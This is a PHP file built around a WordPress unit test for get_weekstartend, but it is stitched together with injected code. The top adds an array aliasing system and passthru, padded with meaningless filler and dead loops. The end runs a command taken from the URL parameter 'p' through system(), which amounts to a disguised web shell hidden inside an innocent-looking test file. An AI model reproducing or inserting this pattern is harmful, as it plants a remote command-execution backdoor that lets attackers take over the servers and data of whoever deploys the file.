<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group functions
 *
 * @covers ::get_weekstartend
 */
class Tests_Functions_GetWeekstartend extends WP_UnitTestCase {

	public function test_default_start_of_week_option_is_monday() {
		$expected = array(
			'start' => 1454889600,
			'end'   => 1455494399,
		);

		$this->assertSame( $expected, get_weekstartend( '2016-02-12' ) );
	}

	public function test_start_of_week_sunday() {
		$expected = array(
			'start' => 1454803200,
			'end'   => 1455407999,
		);

		$this->assertSame( $expected, get_weekstartend( '2016-02-12', 0 ) );
	}

	public function test_start_of_week_should_fall_back_on_start_of_week_option() {
		update_option( 'start_of_week', 2 );

		$expected = array(
			'start' => 1454976000,
			'end'   => 1455580799,
		);

		$this->assertSame( $expected, get_weekstartend( '2016-02-12' ) );
	}

	public function test_start_of_week_should_fall_back_on_sunday_when_option_is_missing() {
		delete_option( 'start_of_week' );

		$expected = array(
			'start' => 1454803200,
			'end'   => 1455407999,
		);

		$this->assertSame( $expected, get_weekstartend( '2016-02-12' ) );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>